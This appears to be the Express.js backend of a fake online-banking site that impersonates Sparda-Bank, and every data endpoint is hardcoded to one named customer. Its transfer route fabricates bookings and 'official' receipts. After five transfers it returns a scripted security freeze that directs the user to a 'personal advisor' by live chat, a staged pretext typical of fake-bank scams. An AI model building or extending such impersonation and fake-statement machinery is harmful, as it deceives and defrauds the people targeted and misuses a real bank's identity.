const express = require('express');
const router = express.Router();
const bcrypt = require('bcrypt');
const pool = require('../../db.cjs');
const { v4: uuidv4 } = require('uuid');
const { generateOfficialKontoauszugStream } = require('./kontoauszug.generator.cjs');

const TARGET_USER_NETKEY = 'Jareed Lacosta';

/**
 * Central Helper Utility
 * Safe UUID fetcher for route pipelines
 */
const getActiveUserId = async () => {
  const result = await pool.query('SELECT id FROM users WHERE netkey ILIKE $1 LIMIT 1', [TARGET_USER_NETKEY]);
  if (result.rows.length === 0) throw new Error('User registry entry missing inside database.');
  return result.rows[0].id;
};

// ===============================================
// 1. AUTHENTICATION ENDPOINT (Called by Login.jsx)
// ===============================================
router.post('/auth/login', async (req, res, next) => {
  try {
    const { netKey, pin } = req.body;

    if (!netKey || !pin) {
      return res.status(400).json({ success: false, message: 'NetKey und PIN sind erforderlich.' });
    }

    // ─── JOIN USERS AND SECURITY_PROFILES ───
    const result = await pool.query(
      `SELECT 
      u.*, 
      sp.secure_go, 
      sp.smart_tan, 
      sp.email_notifications, 
      sp.push_notifications,
      sp.device_model,
      sp.device_activation_date
      FROM users u
      LEFT JOIN security_profiles sp ON u.id = sp.user_id
      WHERE u.netkey ILIKE $1 LIMIT 1`, 
      [netKey.trim()]
    );

    if (result.rows.length === 0) {
      return res.status(401).json({ success: false, message: 'Anmeldedaten sind ungültig (Falscher NetKey oder PIN).' });
    }

    const userRow = result.rows[0]; 

    const match = await bcrypt.compare(pin, userRow.pin_hash);
    if (!match) {
      return res.status(401).json({ success: false, message: 'Anmeldedaten sind ungültig (Falscher NetKey oder PIN).' });
    }

    // ─── SEND ALL PROFILE AND SECURITY FIELDS ───
    return res.status(200).json({
      success: true,
      message: 'Erfolgreich angemeldet.',
      user: {
        id: userRow.id,
        name: `${userRow.first_name || ''} ${userRow.last_name || ''}`.trim(),
        accountType: 'SpardaGiro Klassik',

        // Personal Data
        kundennummer: userRow.kundennummer || '-',
        first_name: userRow.first_name || '-',
        last_name: userRow.last_name || '-',
        geburtsdatum: userRow.geburtsdatum,
        steuer_id: userRow.steuer_id || '-',
        adresse: userRow.adresse || '-',
        telefon: userRow.telefon || '-',
        email: userRow.email || '-',
        mitglied_seit: userRow.mitglied_seit || '-',

        // Security Profile Data
        secure_go: userRow.secure_go ?? true,
        smart_tan: userRow.smart_tan ?? false,
        email_notifications: userRow.email_notifications ?? true,
        push_notifications: userRow.push_notifications ?? false,
        device_model: userRow.device_model || 'Registriertes Smartphone',
        device_activation_date: userRow.device_activation_date
      }
    });
  } catch (err) {
    next(err);
  }
});

// ========================================================
// 2. DASHBOARD BALANCES ENDPOINT (Called by Dashboard.jsx)
// ========================================================
router.get('/balances', async (req, res, next) => {
  try {
  const userId = await getActiveUserId();
  const result = await pool.query(
  'SELECT giro_balance, spar_balance, depot_value, depot_cost_basis FROM balances WHERE user_id = $1 LIMIT 1',
  [userId]
  );

  const balanceRow = result.rows.length ? result.rows[0] : { giro_balance: 0, spar_balance: 0, depot_value: 0, depot_cost_basis: 0 };

  const giro = parseFloat(balanceRow.giro_balance) || 0;
  const spar = parseFloat(balanceRow.spar_balance) || 0;
  const depot = parseFloat(balanceRow.depot_value) || 0;
  const totalWealth = giro + spar + depot;

  return res.status(200).json({
  success: true,
  giroBalance: giro,
  sparBalance: spar,
  depotValue: depot,
  depotCostBasis: parseFloat(balanceRow.depot_cost_basis) || 0,
  gesamtGuthaben: totalWealth
  });
  } catch (err) {
  next(err);
  }
  });
// =========================
// (Called by Header.jsx)
// =========================
router.get('/user/notifications/summary', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    const txCountResult = await pool.query('SELECT COUNT(*) FROM transactions WHERE user_id = $1', [userId]);
    const totalTransactions = parseInt(txCountResult.rows[0].count, 10);

    const dynamicUnreadMails = totalTransactions > 5 ? 4 : 3;

    return res.status(200).json({ success: true, unreadMails: dynamicUnreadMails });
  } catch (err) {
    next(err);
  }
});

// ============================
// (Called by Ueberweisung.jsx)
// ============================
router.post('/transfers', async (req, res, next) => {
  let client;
  try {
    const { trackingNumber, recipientName, recipientIban, recipientBic, amount, purpose, executionDate, transaction_pin } = req.body;

    if (!recipientName || !recipientIban || !amount) {
      return res.status(400).json({ success: false, message: 'Fehlende Pflichtfelder für die Überweisung.' });
    }
    
    const userQuery = await pool.query(
      'SELECT id, transaction_pin_hash, transfer_count FROM users WHERE netkey ILIKE $1 LIMIT 1',
      [TARGET_USER_NETKEY]
    );

    if (userQuery.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Benutzerprofil nicht gefunden.' });
    }

    const user = userQuery.rows[0];
    const userId = user.id;
if (user.transfer_count >= 5) {
  return res.status(403).json({
  success: false,
  error_code: 'ACCOUNT_FROZEN_LOCATION_MISMATCH',
  message: 'Sicherheitshinweis: Aus Sicherheitsgründen wurde Ihre Transaktion vorübergehend angehalten. Bitte wenden Sie sich zur Verifizierung Ihrer Identität über den Live-Chat an Ihren persönlichen Kundenbetreuer.'
  });
  }
    // Vault PIN Check using pgcrypto crypt()
    if (transaction_pin) {
      const pinCheck = await pool.query(
        'SELECT crypt($1, transaction_pin_hash) = transaction_pin_hash AS is_valid FROM users WHERE id = $2',
        [transaction_pin, userId]
      );

      if (!pinCheck.rows[0] || !pinCheck.rows[0].is_valid) {
        return res.status(401).json({ success: false, message: 'Ungültige Transaktions-PIN (Transaction PIN Invalid).' });
      }
    } else {
      return res.status(400).json({ success: false, message: 'Transaktions-PIN erforderlich (Transaction PIN required).' });
    }

    const parsedAmount = Math.abs(parseFloat(amount));

    client = await pool.connect();
    await client.query('BEGIN');

    // 1. Increment counter lock
    await client.query(
      'UPDATE users SET transfer_count = COALESCE(transfer_count, 0) + 1 WHERE id = $1',
      [userId]
    );

    // 2. Deduct Giro balance
    await client.query(
      'UPDATE balances SET giro_balance = giro_balance - $1::numeric WHERE user_id = $2',
      [parsedAmount, userId]
    );

    // 3. Internal transfer check
    const cleanRecipient = String(recipientName).toLowerCase();
    const cleanPurpose = String(purpose).toLowerCase();
    
    if (cleanRecipient.includes('spardaspar') || cleanPurpose.includes('spardaspar')) {
      await client.query(
        'UPDATE balances SET spar_balance = spar_balance + $1::numeric WHERE user_id = $2',
        [parsedAmount, userId]
      );

      await client.query(`
        INSERT INTO savings_history (user_id, name, detail, amount, date, type, icon)
        VALUES ($1, $2, $3, $4, $5, $6, $7);
      `, [
        userId, 
        'Einzahlung vom Girokonto', 
        purpose || 'Sparrate', 
        parsedAmount, 
        executionDate || new Date().toISOString().split('T')[0], 
        'transfer', 
        '🔁'
      ]);
    }
const dbTransactionId = uuidv4();
await client.query(`
INSERT INTO transactions (tracking_number, user_id, tracking_code, execution_date, amount, type, recipient_name, purpose, category, icon)
VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10);
`, [
dbTransactionId,
userId, // $2
trackingNumber || `SP-TX-${Date.now()}-DE`,
executionDate ? new Date(executionDate).toISOString() : new Date().toISOString(), // $4
-parsedAmount, // $5
'expense', // $6
recipientName, // $7
purpose || 'SEPA-Überweisung', // $8
cleanPurpose.includes('dauerauftrag') ? 'Daueraufträge' : 'Ausgaben', // $9
'🛒' // $10
]);
// 5. Generate official Postfach document message
const messageSubject = `📄 Umsatzbeleg Einzelbuchung (${trackingNumber || `SP-TX-${Date.now()}-DE`})`;
const messagePreview = `Bestätigung Ihrer soeben ausgeführten SEPA-Überweisung an ${recipientName}.`;

await client.query(`
INSERT INTO messages (user_id, subject, preview, body, sender, is_unread, date, created_at)
VALUES ($1, $2, $3, $4, $5, $6, $7, $8);
`, [
userId, // $1
messageSubject, // $2
messagePreview, // $3
'Dieser Beleg wurde maschinell erstellt und wird elektronisch bereitgestellt.', // $4 (body fallback)
'Sparda-Bank', // $5
true, // $6 (is_unread)
new Date().toISOString(), // $7 (date)
new Date().toISOString() // $8 (created_at)
]);
    await client.query('COMMIT');
    client.release();

    return res.status(201).json({ 
      success: true, 
      message: 'Überweisung erfolgreich gebucht.',
      transfers_remaining: 4 - user.transfer_count
    });

  } catch (err) {
    if (client) {
      try { await client.query('ROLLBACK'); } catch (rErr) {}
      client.release();
    }
    next(err);
  }
});

// ===========================================
// (Called by Umsaetze.jsx AND Dashboard.jsx)
// ===========================================
router.get('/transfers', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();
    // ⚡ SAFE ALIAS MAP: Renames 'tracking_code' back to 'tracking_number' on the fly for the frontend
    const result = await pool.query(
      'SELECT tracking_code AS tracking_number, execution_date, amount, type, recipient_name, purpose, category, icon FROM transactions WHERE user_id = $1 ORDER BY execution_date DESC', 
      [userId]
    );
    
    return res.status(200).json({ 
      success: true, 
      transactions: result.rows.map(row => ({
        ...row,
        amount: parseFloat(row.amount) // Ensure float for Dashboard math engine
      })) 
    });
  } catch (err) {
    next(err);
  }
});

// ============================
// SPARKONTO (SAVINGS) ENDPOINT
// ============================
router.get('/sparkonto', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    const balanceResult = await pool.query('SELECT spar_balance FROM balances WHERE user_id = $1 LIMIT 1', [userId]);
    const historyResult = await pool.query('SELECT name, detail, amount, date, type, icon FROM savings_history WHERE user_id = $1 ORDER BY date DESC', [userId]);

    const sparBalance = balanceResult.rows.length ? parseFloat(balanceResult.rows[0].spar_balance) : 0;

    return res.status(200).json({
      success: true,
      account: {
        accountName: 'SpardaSpar Extra',
        iban: 'DE89 5009 0500 0012 3456 99',
        balance: sparBalance,
        interestRate: '2,50 %',
        rateLabel: 'p.a. · variabel',
        lastInterestDate: '31.12.2025',
        lastInterestAmount: 184.50,
        interestMethod: 'act/360',
        noticePeriod: '3 Monate',
        depositProtection: 'BVR-Institutssicherung'
      },
      history: historyResult.rows.map(row => ({
        ...row,
        amount: parseFloat(row.amount)
      }))
    });
  } catch (err) {
    next(err);
  }
});

// ===============
// (Called by Karten.jsx)
// ===============
router.get('/cards/data', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    // 1. Fetch user cards
    const cardsResult = await pool.query(
      `SELECT
      card_type,
      card_name,
      masked_number,
      expiry_date,
      status,
      daily_limit::float AS daily_limit,
      credit_limit::float AS credit_limit,
      used_amount::float AS used_amount,
      mobile_pay_active
      FROM user_cards
      WHERE user_id = $1`,
      [userId]
    );

    //  Fetch security settings
    const settingsResult = await pool.query(
      `SELECT contactless, online_payments, foreign_payments
      FROM security_profiles
      WHERE user_id = $1 LIMIT 1`,
      [userId]
    );

    const settingsRow = settingsResult.rows.length
      ? settingsResult.rows[0]
      : { contactless: true, online_payments: true, foreign_payments: false };

    return res.status(200).json({
      success: true,
      cards: cardsResult.rows,
      settings: {
        contactless: settingsRow.contactless,
        onlinePayments: settingsRow.online_payments,
        foreignPayments: settingsRow.foreign_payments
      }
    });
  } catch (err) {
    next(err);
  }
});

// ====================
// UNION DEPOT ENDPOINT
// ====================
router.get('/depot', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    // 1. Fetch user to generate a dynamic Depot Number
    const userResult = await pool.query('SELECT kundennummer FROM users WHERE id = $1', [userId]);
    const kundennummer = userResult.rows.length ? userResult.rows[0].kundennummer : '000000';

    // 2. Fetch balances
    const balanceResult = await pool.query('SELECT depot_value, depot_cost_basis FROM balances WHERE user_id = $1 LIMIT 1', [userId]);
    const balanceRow = balanceResult.rows.length ? balanceResult.rows[0] : { depot_value: 0, depot_cost_basis: 0 };

    // 3. Fetch active positions
    const positionsResult = await pool.query('SELECT name, isin, shares, value, performance, icon, sparplan_info AS "sparplanInfo" FROM depot_positions WHERE user_id = $1', [userId]);

    return res.status(200).json({
      success: true,
      account: {
        depotNumber: `DEP-${kundennummer}`,
        custodyType: 'Inlandsverwahrung'
      },
      depotValue: parseFloat(balanceRow.depot_value),
      costBasis: parseFloat(balanceRow.depot_cost_basis),
      positions: positionsResult.rows.map(row => ({
        ...row,
        shares: parseFloat(row.shares),
        value: parseFloat(row.value),
        performance: parseFloat(row.performance)
      }))
    });
  } catch (err) {
    next(err);
  }
});

// =======================
// (Called by Profil.jsx)
// =======================
router.post('/user/settings', async (req, res, next) => {
  try {
    const { field, value } = req.body;
    const userId = await getActiveUserId();
    
    const columnMapping = {
      secureGo: 'secure_go',
      smartTan: 'smart_tan',
      emailNotifications: 'email_notifications',
      pushNotifications: 'push_notifications'
    };
    
    const targetColumn = columnMapping[field];
    if (!targetColumn) {
      return res.status(400).json({ success: false, message: 'Ungültiges Sicherheitsfeld.' });
    }
    
    const sql = `UPDATE security_profiles SET ${targetColumn} = $1 WHERE user_id = $2`;
    await pool.query(sql, [Boolean(value), userId]);
    
    return res.status(200).json({ success: true, message: 'Sicherheitsverfahren erfolgreich aktualisiert.' });
  } catch (err) {
    next(err);
  }
});

// ========================================================
// (Called by Dauerauftrag.jsx AND Dashboard.jsx)
// ========================================================
router.get('/dauerauftraege', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();
    
    // We select the new schema columns and map them to support BOTH older and newer frontend files safely.
    const result = await pool.query(
      'SELECT id, recipient_name, amount, purpose, execution_day FROM standing_orders WHERE user_id = $1',
      [userId]
    );

    const nextDate = new Date();
    nextDate.setMonth(nextDate.getMonth() + 1);
    nextDate.setDate(1); 

    return res.status(200).json({ 
      success: true, 
      orders: result.rows.map(row => ({
        ...row,
        amount: parseFloat(row.amount),
        // These fields ensure Dauerauftrag.jsx does not crash on the new database schema
        recipient_iban: 'DE•• •••• •••• ••••',
        schedule_text: `Ausführung monatlich zum ${row.execution_day}.`,
        icon: '🔄',
        bg_color: 'var(--gray-100)'
      })),
      nextExecutionDate: nextDate.toLocaleDateString('de-DE', { day: '2-digit', month: '2-digit', year: 'numeric' })
    });
  } catch (err) {
    next(err);
  }
});

// ========================================================
// (Called specifically by Dashboard.jsx)
// ========================================================
router.get('/messages', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();
    const result = await pool.query(
      'SELECT id, subject, preview, is_unread AS "isUnread", date, icon FROM mailbox_messages WHERE user_id = $1 ORDER BY date DESC',
      [userId]
    );

    return res.status(200).json({
      success: true,
      messages: result.rows
    });
  } catch (err) {
    next(err);
  }
});

// =============================
// (Called by Postfach.jsx)
// =============================
router.get('/user/messages', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    // Fetch all messages for the user, newest first
    const result = await pool.query(
      `SELECT id, subject, preview, body, sender, is_unread, date
      FROM messages
      WHERE user_id = $1
      ORDER BY created_at DESC`,
      [userId]
    );

    return res.status(200).json({ success: true, messages: result.rows });
  } catch (err) {
    next(err);
  }
});

// =========================
// (Called by Postfach.jsx)
// =========================
router.get('/sparda/kontoauszug/:trackingNumber', generateOfficialKontoauszugStream);

module.exports = router;
